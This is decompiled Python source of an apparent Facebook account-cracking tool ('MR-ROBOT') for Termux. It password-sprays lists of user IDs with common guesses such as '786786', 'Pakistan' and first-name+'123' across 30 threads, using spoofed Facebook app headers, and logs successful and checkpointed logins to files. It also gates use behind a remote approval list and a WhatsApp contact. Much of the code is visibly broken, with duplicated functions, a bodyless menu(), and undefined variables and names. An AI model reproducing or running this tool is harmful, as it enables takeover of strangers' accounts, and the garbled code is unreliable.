# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.17 (default, Dec  5 2019, 10:45:36)
# [GCC 4.2.1 Compatible Android (5220042 based on r346389c) Clang 8.0.7 (https://
# Embedded file name: aso

import os, sys, time, datetime, re, threading, json, random, requests, hashlib, cookielib, uuid
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
os.system('termux-setup-storage')
try:
    os.mkdir('/sdcard/ids')
except OSError:
    pass

bd = random.randint(20000000.0, 30000000.0)
sim = random.randint(20000.0, 40000.0)
bd = random.randint(20000000.0, 30000000.0)
sim = random.randint(20000, 40000)
header = {'x-fb-connection-bandwidth': repr(bd),
   'x-fb-sim-hni': repr(sim),
   'x-fb-net-hni': repr(sim),
   'x-fb-connection-quality': 'EXCELLENT',
   'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
   'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]',
   'content-type': 'application/x-www-form-urlencoded',
   'x-fb-http-engine': 'Liger'}
os.system('git pull')
os.system('clear')
c = '\x1b[1;32m\x1b[0;97m\x1b[1;32m'
c2 = '\x1b[0;97m\x1b[1;32m\x1b[0;97m'
c3 = '\x1b[1;31m\x1b[0;97m\x1b[1;31m'
os.system('git pull')
os.system('clear')
logo = '
\033[1;94m  ___   _____  _     _  _     _  ___    ___   
\033[1;91m(  _ \(  _  )( )   ( )( )   ( )(  _ \ (  _ \ 
\033[1;92m | (_(_) (_) | \ \_/ /  \ \_/ / | (_(_)| | ) |
\033[1;93m  \__ \(  _  )   \ /      \ /   |  _)_ | | | )
\033[1;95m ( )_) | | | |   | |      | |   | (_( )| |_) |
\033[1;97m  \(___)_) (_)   (_)      (_)   (____/ (____/ 
\033[1;94m  (_)                                         
\033[1;96m
\033[1;94m  _______ _____  _   _ _____  ___    _     _ _____ 
\033[1;92m (_____  )  _  )( ) ( )  _  )|  _ \ ( )   ( )  _  )
\033[1;93m      / /| (_) || |/ /| (_) || (_) ) \ \_/ /| (_) |
\033[1;95m    / /  (  _  )|   ( (  _  )|    /    \ /  (  _  )
\033[1;94m  / / ___| | | || |\ \| | | || |\ \    | |  | | | |
\033[1;96m (_______)_) (_)( ) (_)_) (_)(_) (_)   (_)  (_) (_)
\033[1;97m                /(                                 
\033[1;94m               (__)                  

\033[1;93m\033[1;92m\033[1;93m WhatsApp Number \033[1;94m\033[1;95m\033[1;93m  \033[1;96m\033[1;93m +923482860857 \033[1;92m\033[1;95m
\033[1;97m✮❂❂❂❂❂❂❂❂❂❂❂❂✮\033[1;91mMR-ROBOT\033[1;97m✮❂❂❂❂❂❂❂❂❂❂❂❂✮'

def reg():
    os.system('clear')
    print logo
    print ''
    print '\x1b[1;31;1mTake The Approval For Login'
    print ''
    time.sleep(1)
    try:
        to = open('/sdcard/.hst.txt', 'r').read()
    except (KeyError, IOError):
        reg2()

    r = requests.get('https://raw.githubusercontent.com/aryanotriks/Filecrack/main/robot.txt').text
    if to in r:
        os.system('cd ..... && npm install')
        os.system('fuser -k 5000/tcp &')
        os.system('#')
        os.system('cd ..... && node index.js &')
        time.sleep(5)
        ip()
    else:
        os.system('clear')
        print logo
        print ''
        print '\tApproved Failed'
        print ''
        print ' \x1b[1;92mYour Id Is Not Approved Already '
        print ''
        print ' \x1b[1;92mCopy token id and send to MR-ROBOT'
        print ''
        print ' \x1b[1;92mYour id: ' + to
        print ''
        raw_input('\x1b[1;93m Press enter to send id')
        os.system('xdg-open https://wa.me/+923472860857')
        reg()


def reg2():
    os.system('clear')
    print logo
    print ''
    print '\tApproval not detected'
    print ''
    print ' \x1b[1;92mCopy and press enter , And Send Me On Facebook'
    print ''
    id = uuid.uuid4().hex[:50]
    print ' Your id: ' + id
    print ''
    print ''
    raw_input(' Press enter to go to Whatsapp ')
    os.system('xdg-open https://wa.me/+923472860857')
    sav = open('/sdcard/.hst.txt', 'w')
    sav.write(id)
    sav.close()
    raw_input('\x1b[1;92m Press enter to check Approval ')
    reg()
    
    def reg2():
    os.system('clear')
    print logo
    print ''
    print '\tApproval not detected'
    print ''
    print ' \x1b[1;92mCopy and press enter , And Send Me On Whatsapp'
    print ''
    id = uuid.uuid4().hex[:50]
    print ' Your id: ' + id
    print ''
    print ''
    raw_input(' Press enter to go to Whatsapp ')
    os.system('xdg-open https://wa.me/+923472860857')
    sav = open('/sdcard/.hst.txt', 'w')
    sav.write(id)
    sav.close()
    raw_input('\x1b[1;92m Press enter to check Approval ')
    reg()


def ip():
    os.system('clear')
    print logo
    print ''
    print '\tCollecting device info'
    print ''
    try:
        ipinfo = requests.get('http://ip-api.com/json/')
        z = json.loads(ipinfo.text)
        ips = z['query']
        country = z['country']
        regi = z['regionName']
        network = z['isp']
    except:
        pass

    print '\x1b[1;93m Your ip: ' + ips
    time.sleep(2)
    print ''
    print '\x1b[1;95m Your country: ' + country
    time.sleep(2)
    print ''
    print '\x1b[1;92m Your region: ' + regi
    time.sleep(2)
    print ''
    print ' \x1b[1;97mYour network: ' + network
    time.sleep(1)
    print ''
    print ' Loading ...'
    time.sleep(1)
    menu()


def menu()
    except requests.exceptions.ConnectionError:
        print logo
        print ''
        print '\t Turn on mobile data/wifi\x1b[0;97m'
        print ''
        raw_input(' \x1b[1;92mPress enter after turning on mobile data/wifi ')
        menu()

    os.system('clear')
    print logo
    tok = open('/sdcard/.hst.txt', 'r').read()
    print ''
    print '  \x1b[1;92mLogged in user: ' + z
    print ''
    print ' \x1b[1;93m Active token: ' + tok
    print ''
    print ' ------------------------------------------ '
    print ''
    print '\x1b[1;92m[1] Crack without login'
    print '\x1b[1;92m[2] Join Mr-Robot Whatsapp Group'
    print ''
    menu_s()


def menu_s():
    ms = raw_input('\x1b[1;92m\xe2\x95\xb0\xe2\x94\x80Mr-Robot\xe2\x9e\xa4 ')
    if ms == '1':
        Robot()
    if ms == '2':
    	os.system('xdg-open https://chat.whatsapp.com/C9VZx0EQQJ07TVeW80qgDe')
    else:
        print ''
        print '\tSelect valid option'
        print ''
        menu_s()


def Robot():
    os.system('clear')
    print logo1
    print '\x1b[1;91m[1]  START CLONING'
    time.sleep(0.10)
    print '\x1b[1;93m[0] back'
   
    time.sleep(0.05)
    action()

def action():
    peak = raw_input('\n\033[1;97mCHOOSE:\033[1;97m')
    if peak =='':
        print '[!] Fill In Correctly'
        action()
    elif peak =="1":              
        os.system("clear")
        print logo2
        print "Enter any Id Code Or Numeric Number"+'\n'
        print '\x1b[1;91mEnter any degit from 01 to 99'
        try:
            c = raw_input("\033[1;97mCHOOSE : ")
            uid="1000"
            idlist = ('.txt')
            for line in open(idlist,"r").readlines():
                id.append(line.strip())
        except IOError:
            print ("[!] File Not Found")
            raw_input("\n[ Back ]")
            blackmafiax() 
    elif peak =='0':
        login()
    else:
        print '[!] Fill In Correctly'
        action()
    print (logo1)
    os.system("clear")
    print 50* '\033[1;94m-'
    xxx = str(len(id))
    jalan ('\033[1;91m Total ids number: '+xxx)
    jalan ('\033[1;92mCode you choose: '+c)
    jalan ("\033[1;93mWait A While \x1b[1;94mStart Cracking...")
    jalan ("\033[1;94mTo Stop Process Press Ctrl+z")
    print 50* '\033[1;97m-'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
    def main(arg):
        user = arg
        uid, name = user.split('|')
        try:
            pass1 ="786786"
            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[1;92m[MRP-OK] ' + uid + ' | ' + pass1
                ok = open('/sdcard/ids/MRP-OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\x1b[1;93m[MRP-CP] ' + uid + ' | ' + pass1
                cp = open('MRP-CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                pass2 ="Pakistan"
                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;92m[MRP-OK] ' + uid + ' | ' + pass2
                    ok = open('/sdcard/ids/MRP-OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\x1b[1;93m[MRP-CP] ' + uid + ' | ' + pass2
                    cp = open('MRP-CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    pass3 = "000786"
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;92m[MRP-OK] ' + uid + ' | ' + pass3
                        ok = open('/sdcard/ids/MRP-OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\x1b[1;93m[MRP-CP] ' + uid + ' | ' + pass3
                        cp = open('MRP-CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                    	pass4="889900"
                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;92m[MRP-OK] ' + uid + ' | ' + pass4
                            ok = open('/sdcard/ids/MRP-OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\x1b[1;93m[MRP-CP] ' + uid + ' | ' + pass4
                            cp = open('MRP-CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.apppend(uid + pass4)
                        else:
                        	pass5="India123"
                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers=header).text
                            q = json.loads(data)
                            if 'loc' in q:
                                print '\x1b[1;92m[MRP-OK] ' + uid + ' | ' + pass5
                                ok = open('/sdcard/ids/MRP-OK.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error']:
                                print '\x1b[1;93m[MRP-CP] ' + uid + ' | ' + pass5
                                cp = open('MRP-CP.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.apppend(uid + pass5)
                            else:
                            	pass6=a['first_name']+'123'
                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers=header).text
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\x1b[1;92m[MRP-OK] ' + uid + ' | ' + pass6
                                    ok = open('/sdcard/ids/MRP-OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error']:
                                    print '\x1b[1;93m[MRP-CP] ' + uid + ' | ' + pass6
                                    cp = open('MRP-CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    cps.apppend(uid + pass6)
                                else:
                                	pass7=a['last_name']+'123'
                                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers=header).text
                                    q = json.loads(data)
                                    if 'loc' in q:
                                        print '\x1b[1;92m[MRP-OK] ' + uid + ' | ' + pass7
                                        ok = open('/sdcard/ids/MRP-OK.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error']:
                                        print '\x1b[1;93m[MRP-CP] ' + uid + ' | ' + pass7
                                        cp = open('MRP-CP.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
                                        cps.apppend(uid + pass7)
                                    else:
                                    	pass8=a['first_name']+'786'
                                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass8, headers=header).text
                                        q = json.loads(data)
                                        if 'loc' in q:
                                            print '\x1b[1;92m[MRP-OK] ' + uid + ' | ' + pass8
                                            ok = open('/sdcard/ids/MRP-OK.txt', 'a')
                                            ok.write(uid + ' | ' + pass8 + '\n')
                                            ok.close()
                                            oks.append(uid + pass8)
                                        elif 'www.facebook.com' in q['error']:
                                            print '\x1b[1;93m[MRP-CP] ' + uid + ' | ' + pass8
                                            cp = open('MRP-CP.txt', 'a')
                                            cp.write(uid + ' | ' + pass8 + '\n')
                                            cp.close()
                                            cps.apppend(uid + pass8)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print ''
    print 47 * '-'
    print ''
    print ' \x1b[1;92mProcess Has Been Completed'
    print ' \x1b[1;92mTotal Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))
    print ''
    print 47 * '-'
    print ''
    raw_input(' \x1b[1;93mPress enter to back')
    auto_crack()


if __name__ == '__main__':
	Robot()
